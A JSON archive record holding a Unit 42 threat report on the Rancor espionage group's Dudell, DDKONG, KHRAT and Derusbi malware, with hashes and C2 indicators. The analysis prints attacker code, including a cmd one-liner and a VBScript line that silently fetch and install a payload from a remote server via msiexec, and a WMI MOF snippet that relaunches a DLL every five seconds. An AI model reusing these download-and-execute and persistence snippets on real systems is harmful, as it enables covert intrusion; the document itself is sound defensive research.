{
    "id": "c9e97728-faa6-41aa-8c33-acccdb620b29",
    "created_at": "2022-10-25T16:48:18.953515Z",
    "updated_at": "2025-03-27T02:13:44.627472Z",
    "deleted_at": null,
    "sha1_hash": "e54539e7a87e229b70384bd20943c2afd689445c",
    "title": "",
    "authors": "",
    "file_creation_date": "2019-12-18T09:55:01Z",
    "file_modification_date": "2019-12-18T09:55:01Z",
    "file_size": 469460,
    "plain_text": "# Rancor: Cyber Espionage Group Uses New Custom Malware to Attack Southeast Asia\n\n**[unit42.paloaltonetworks.com/rancor-cyber-espionage-group-uses-new-custom-malware-to-attack-southeast-asia](https://unit42.paloaltonetworks.com/rancor-cyber-espionage-group-uses-new-custom-malware-to-attack-southeast-asia/)**\n\nJen Miller-Osborn, Mike Harbison December 17, 2019\n\n[This post is also available in: ⽇本語 (Japanese)](https://unit42.paloaltonetworks.jp/rancor-cyber-espionage-group-uses-new-custom-malware-to-attack-southeast-asia/)\n\n## Executive Summary\n\nIn late June 2018, Unit 42 revealed a previously unknown cyber espionage group we dubbed\n[Rancor, which conducted targeted attacks in Southeast Asia throughout 2017 and 2018. In recent](https://unit42.paloaltonetworks.com/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/)\nattacks, the group has persistently targeted at least one government organization in Cambodia\nfrom December 2018 through January 2019. While researching these attacks, we discovered an\nundocumented, custom malware family – which we’ve named Dudell. In addition, we discovered\nthe group using Derusbi, which is a malware family believed to be unique to a small subset of\nChinese cyber espionage groups.\n\n### Attack Details\n\nBetween early December 2018 and the end of January 2019, Rancor conducted at least two\nrounds of attacks intending to install Derusbi or KHRat malware on victim systems. January 2019\nsent via 149.28.156[.]61 to deliver either Derusbi or KHRat samples with either\ncswksfwq.kfesv[.]xyz or connect.bafunpda[.]xyz as C2.\n\n### Malware Overview\n\n#### DUDELL\n\n\n-----\n\n##### SHA256 0d61d9baab9927bb484f3e60384fdb6a3709‐ ca74bc6175ab16b220a68f2b349e\n\n File Type Microsoft Excel 97 – 2003 Document\n\n\n##### File Name\n\n\n##### Equipment Purchase List 2018-2020(Final).xls\n\n\n_Table 1. DUDELL properties_\n\nThe DUDELL sample is a weaponized Microsoft Excel document that contains a malicious macro\nthat runs on the victim’s machine. It shares the same malicious behavior reported by Checkpoint\n[in Rancor: The Year of The Phish SHA-1 c829f5f9ff89210c888c1559bb085ec6e65232de. In](https://research.checkpoint.com/rancor-the-year-of-the-phish/)\nCheck Point’s blog, the sample is from December 2018 while this sample is from April 2018. It\nhas the following metadata:\n\n##### Codepage 1252\n\n Author MS\n\n Last author MS\n\n Application name Microsoft Excel\n\n Creation time Mon Oct 14 23:33:28 1996\n\n Last Save time Wed Apr 11 02:18:59 2018\n\n Security type 0\n\n_Table 2. DUDELL file metadata_\n\nThe macro in this document gets executed when the user views the document and clicks Enable\nContent, at which point the macro locates and executes the data located under the Company field\nin the document’s properties. The data located under the Company field is:\n\n##### cmd /c set /p=Set v=CreateObject(^”Wscript.Shell^”):v.Run ^”msiexec /q /i http://199.247.6[.]253/ud^”,false,0 <nul > C:\\Windows\\System32\\spool\\drivers\\color\\tmp.vbs\n\n_Table 3. Company field data_\n\nThe C2 server 199.247.6[.]253 listed above in Table 5 is known to be used by the Rancor group.\nThe script is downloading a second stage payload via the Microsoft tool msiexec. Unfortunately at\nthe time of discovery, the hosted file is unavailable. Our systems were able to record the hash of\nfile tmp.vbs, but the contents of the file are no longer available. See Table 5 below for hash\nvalues. Pivoting off the filename and directory, we discovered a similar VBS script used by the\nRancor actors that might give us some clues on what the contents of tmp.vbs would resemble.\n\n\n-----\n\nFile office.vbs (SHA256:\n4b0b319b58c2c0980390e24379a2e2a0a1e1a91d17a9d3e26be6f4a39a7afad2) was discovered\nin directory c:\\Windows\\System32\\spool\\drivers\\color. The contents of that file are:\n\n##### Set v=CreateObject(“Wscript.Shell”):v.Run “msiexec /q /i http://199.247.6[.]253/OFFICE”,false,0\n\n_Table 4. Contents of office.vbs_\n\n##### SHA256 b958e481c90939962081b9fb85451a2fb28f705d5b5060f5d9d5aebfb390f832\n\n_Table 5. Hashes for tmp.vbs_\n\nIf the file tmp.vbs does in fact contain similar content as that of office.vbs, then it could be another\nmethod for downloading payloads onto the target.\n\n#### DDKONG Plugin\n\n##### SHA256 0EB1D6541688B5C87F620E76219EC5D‐ B8A6F05732E028A9EC36195D7B4F5E707\n\n\n##### Compile Date and Time\n\n\n##### 2017-02-17 08:33:45 AM\n\n\n##### File Type PE32 executable (DLL) Intel 80386, for MS Windows\n\n File Name History.nls\n\n_Table 6. DDKONG Plugin properties_\n\nThe malware in question is configured with the following single export entry:\n\nDllInstall\n\nThe DllInstall export function is responsible for the core behavior of the malware, as just loading it\ndoes nothing. Once this export is called, it checks for a hidden window with a caption of Hello\nGoogle! and a class name of Google see Figure 1 below. This check is performed to ensure that\nonly one instance of the malware is running at a time.\n\n\n-----\n\n_Figure 1. DDKONG Plugin hidden window properties_\n\nThe hidden window created by the malware filters on any user input (e.g. keyboard or mouse\nactivity). This could be an attempt to evade sandbox analysis as mouse and keyboard movement\nis typically not performed. The malware then proceeds to beacon to a configured remote server of\ncswksfwq.kfesv[.]xyz on TCP port 8080. Upon successful connection, the malware transmits\nvictim information such as: hostname, IP address, Language Pack along with other operating\nsystem information. The data transmitted are XOR encoded. The malware supports the following\ncapabilities:\n\nTerminate specific process\nEnumerate processes\nUpload file\nDownload file\nDelete file\nList folder contents\nEnumerate storage volumes\nExecute a command\nReverse shell\n\n\n-----\n\nTake a screenshot\n\n### KHRAT\n\n##### SHA256 aaebf987b8d80d71313c3c0f2c16d60874ffecbdda3b‐ b6b44d6cba6d38031609\n\n\n##### Compile Date and Time\n\n\n##### 2018-05-02 05:22:23 PM\n\n\n##### File Type PE32 executable (DLL) Intel 80386, for MS Windows\n\n File Name 8081.dll\n\n_Table 7. KHRAT properties_\n\nThe malware in question is configured with the following single export entry:\n\nRmcmd\n\nWhen the DLL is initially loaded, it dynamically resolves and imports additional modules (DLLs’)\nneeded. Once loaded and the export entry of Rmcmd is called, it creates a Windows mutex\nnamed gkdflbmdfk. This ensures that only one copy of the malware is running at a time. It then\nbegins to beacon to a configured domain of connect.bafunpda[.]xyz on TCP port 8081. The\nmalware collects and transmits data from the host, such as hostname and is XOR encoded with\nthe first byte of the network traffic being the key. This malware supports the following capabilities:\n\nReverse Shell\n\nThe malware behavior and code share similarities with an older KHRAT sample from May 2018.\nSample (SHA256:\nbc1c3e754be9f2175b718aba62174a550cdc3d98ab9c36671a58073140381659) has the same\nexport entry name and is also a reverse shell. The newer sample appears to be a re-write for\noptimization purposes with the underlying behavior remaining the same, reverse shell.\n\n#### Derusbi\n\n##### SHA256 83d1d181a6d583bca2f03c3c4e517757a766da5f4c1299f‐ bbe514b3e2abd9e0d\n\n\n##### Compile Date and Time\n\n\n##### 2012-09-14 09:20:12 AM\n\n\n##### File Type PE32 executable (DLL) Intel 80386, for MS Windows\n\n File Name 32.dll\n\nTable 8. Derusbi properties\n\n\n-----\n\nDerusbi is a backdoor Trojan believed to be used among a small group of attackers, which\nincludes the Rancor group. This particular sample is a loader that loads an encrypted payload for\nits functionality. This DLL requires the loading executable to include a 32-byte key on the\ncommand line to be able to decrypt the embedded payload, which unfortunately we do not have.\nEven though we don’t have the decryption key or loader, we have uncovered some interesting\nartifacts.\n\nIf the module that loads the sample is named myapp.exe the module will exit\nOnce loaded, it sleeps for six seconds\nLooks for a Windows pipe named \\\\.\\pipe\\_kernel32.dll.ntdll.dll.user32.dll\nLooks for a Windows device named \\Device\\acpi_010221\nCreates the following registry key\nHKEY_CLASSES_ROOT\\CDO.SS_NNTPOnPostEarlySink.2\nTwo DWORD values named IDX and Ver.\n\nSaves encrypted data at these keys\nThe encryption routine to decrypt the embedded payload is MS_ENH_RSA_AES_PROV\n\n#### Rancor VBScript\n\nIn July 2019, we discovered an interesting VBScript named Chrome.vbs (SHA256:\n0C3D4DFA566F3064A8A408D3E1097C454662860BCACFB6675D2B72739CE449C2)\nassociated with the Rancor group. This particular VBScript payload beacons to domain\nbafunpda[.]xyz, which is also used by the KHRAT Trojan listed above in Table 2. This VBScript is\nobfuscated and contains packed data that is used to infect a target with multiple chained\npersistent artifacts. The following illustrates the behavior when the VBScript is executed:\n\n\n-----\n\n_Figure 2. VBScript execution flow_\n\nFigure 1 provides a visual overview of when the VBScript is executed on a host. The script\nperforms the following actions:\n\n1. Copies regsvr32.exe from %windir%\\syswow64 to %windir%\\spoolsw.exe.\n2. Creates a text file named vdfjgklffsdfmv.txt in the host’s %TMP% folder. This file is not a\n\ntext file, but a Windows Management Object File MOF.\n3. Executes Windows mofcomp.exe passing in the MOF file created in step 2.\n4. Adds data to two registry keys: classes and media. Data is saved in the default keys.\n\n\n-----\n\n5. Reads the blob of data from the registry key classes created in step 4 and saves the data to\n\nfile %windir%\\pla.dat.\n\nThe MOF file created by the VBScript is used as a persistence mechanism via Windows\nManagement Instrumentation (WMI) Event Subscriptions. MOF files are compiled scripts that\ndescribe Common Information Model (CIM) classes, which are compiled into the WMI repository.\n[The technique is described by MITRE ATT&CK IDT1084. This particular MOF file creates a timer](https://attack.mitre.org/techniques/T1084/)\nevent that is triggered every five seconds. Snippet of the MOF file is illustrated in Figure 3 below:\n\n##### instance of CommandLineEventConsumer as $Cons {\n\n Name = “SCM Event Log Filter”;\n\n RunInteractively=false;\n\n CommandLineTemplate=”c:\\\\windows\\\\spoolsw.exe /s /n /i c:\\\\windows\\\\pla.dat”;\n\n };\n\n instance of __EventFilter as $Filt\n\n {\n\n Name = “SCM Event Log Filter”;\n\n EventNamespace = “Root\\\\Cimv2”;\n\n Query = “Select * From __InstanceModificationEvent “\n\n “Where TargetInstance Isa \\”Win32_LocalTime\\” “\n\n “And TargetInstance.Second = 5”;\n\n QueryLanguage = “WQL”;\n\n };\n\n_Figure 3. Snippet of MOF file_\n\nFigure 3 shows the main functionality of the MOF file. It has a unique name of SCM Event Log\nFilter and runs spoolsw.exe every 5 seconds, with the /s /n /i parameters passing in file pla.dat. If\nwe recall earlier from the VBScript, spoolsw.exe is the hosts Windows regsvr32.exe.\nRegsvr32.exe is a Windows tool that registers a module (DLL). The parameters passed instruct\nregsvr32 not to display any message boxes (/s), do not call DllRegisterServer or\nDllUnregisterServer (/n) and calls DllInstall (/i). File pla.dat therefore must be a DLL.\n\nThe registry values created by the VBScript are as follows:\n\n1. HKEY_CURRENT_USER\\Software\\Classes\n\nContains x86 code for a DLL. It is missing the first byte of 0x4 which is added by the\nVBScript when file pla.dat is created.\n\n\n-----\n\nFile Properties for embedded registry data at HKEY_CURRENT_USER\\Software\\Classes\n\n##### SHA256 DB982B256843D8B6429AF24F766636B‐ B0BF781B471922902D8DCF08D0C58511E\n\n\n##### Compile Date and Time\n\n\n##### 2018-04-24 10:51:14 PM\n\n\n##### File Type PE32 executable (DLL) Intel 80386, for MS Windows\n\n Export Table DllInstall\n\n_Table 9. Reg Classes embedded data properties_\n\nThe DLL embedded in this registry key is a simple loader that loads the code from the registry\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Clients\\Media\n\n1. HKEY_LOCAL_MACHINE\\SOFTWARE\\Clients\\Media\n\nContains shellcode and x86 code for a DLL. Data saved in registry is encoded with a\nXOR key of 0x9C.\n\n##### SHA256 CC081FFEA6F4769733AF9D0BAE0308CA0AE63667‐ FA225E7965DF0884E96E2D2A\n\n\n##### Compile Date and Time\n\n\n##### 2018-01-10 09:16:42 PM\n\n\n##### File Type PE32 executable (DLL) Intel 80386, for MS Windows\n\n_Table 10. Decoded media DLL data properties_\n\n[The DLL located in the Media registry key is a variant of the KHRAT Trojan. It beacons to domain](https://unit42.paloaltonetworks.com/unit42-updated-khrat-malware-used-in-cambodia-attacks/)\nconnect.bafunpda[.]xyz and attempts to connect to TCP port 4433. This is the same domain used\nby the KHRAT Trojan listed above in Table 2 and shares the same behavior.\n\n## Conclusion\n\nRancor, a cyber espionage group active since at least 2017, continues to conduct targeted\nattacks in Southeast Asia and has been found using an undocumented, custom malware family –\nwhich we’ve dubbed Dudell – to download a second stage payload once its malicious macro is\nexecuted. Additionally, Rancor is also using the Derusbi malware family to load a secondary\npayload once it infiltrates a target.\n\n[Palo Alto Networks customers are protected from this threat. Our threat prevention platform](https://www.paloaltonetworks.com/solutions/initiatives/threat-prevention)\n[detects these malware families, with Wildfire while and simultaneously updating the ‘malware’](https://www.paloaltonetworks.com/products/secure-the-network/wildfire)\n[category within the PAN-DB URL filtering solution for compromised domains it has identified.](https://www.paloaltonetworks.com/products/threat-detection-and-prevention/web-security)\nAutoFocus customers can further investigate this activity with the following tags:\n\n### Indicators of Compromise\n\n\n-----\n\n### SHA256:\n\n0EB1D6541688B5C87F620E76219EC5DB8A6F05732E028A9EC36195D7B4F5E707\nAAEBF987B8D80D71313C3C0F2C16D60874FFECBDDA3BB6B44D6CBA6D38031609\n0D61D9BAAB9927BB484F3E60384FDB6A3709CA74BC6175AB16B220A68F2B349E\nDB982B256843D8B6429AF24F766636BB0BF781B471922902D8DCF08D0C58511E\nCC081FFEA6F4769733AF9D0BAE0308CA0AE63667FA225E7965DF0884E96E2D2A\nBC1C3E754BE9F2175B718ABA62174A550CDC3D98AB9C36671A58073140381659\n83d1d181a6d583bca2f03c3c4e517757a766da5f4c1299fbbe514b3e2abd9e0d\n\n### C2s\n\ncswksfwq.kfesv[.]xyz\n\nConnect.bafunpda[.]xyz\n\n199.247.6[.]253\n\n#### Get updates from Palo Alto Networks!\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2019/2019.12.17.Rancor/Rancor_%20Cyber%20Espionage%20Group%20Uses%20New%20Custom%20Malware%20to%20Attack%20Southeast%20Asia.pdf"
    ],
    "report_names": [
        "Rancor_ Cyber Espionage Group Uses New Custom Malware to Attack Southeast Asia"
    ],
    "threat_actors": [
        {
            "id": "416f8374-2b06-47e4-ba91-929b3f85d9bf",
            "created_at": "2022-10-25T16:07:24.093951Z",
            "updated_at": "2025-03-27T02:02:10.105752Z",
            "deleted_at": null,
            "main_name": "Rancor",
            "aliases": [
                "Rancor Group",
                "Rancor Taurus"
            ],
            "source_name": "ETDA:Rancor",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "Agentemis",
                "Cobalt Strike",
                "CobaltStrike",
                "DDKONG",
                "Derusbi",
                "Dudell",
                "ExDudell",
                "KHRAT",
                "PLAINTEE",
                "RoyalRoad",
                "certutil",
                "certutil.exe",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "e8aee970-e31e-489f-81c2-c23cd52e255c",
            "created_at": "2023-01-06T13:46:38.763687Z",
            "updated_at": "2025-03-27T02:00:02.91243Z",
            "deleted_at": null,
            "main_name": "RANCOR",
            "aliases": [
                "Rancor",
                "Rancor Group",
                "G0075",
                "Rancor Taurus",
                "Rancor group"
            ],
            "source_name": "MISPGALAXY:RANCOR",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "6d11e45c-4e31-4997-88f5-295b2564cfc6",
            "created_at": "2022-10-25T15:50:23.794721Z",
            "updated_at": "2025-03-27T02:00:55.548806Z",
            "deleted_at": null,
            "main_name": "Rancor",
            "aliases": [
                "Rancor"
            ],
            "source_name": "MITRE:Rancor",
            "tools": [
                "DDKONG",
                "PLAINTEE",
                "certutil"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716498,
    "ts_updated_at": 1743041624,
    "ts_creation_date": 1576662901,
    "ts_modification_date": 1576662901,
    "files": {
        "pdf": "https://archive.orkl.eu/e54539e7a87e229b70384bd20943c2afd689445c.pdf",
        "text": "https://archive.orkl.eu/e54539e7a87e229b70384bd20943c2afd689445c.txt",
        "img": "https://archive.orkl.eu/e54539e7a87e229b70384bd20943c2afd689445c.jpg"
    }
}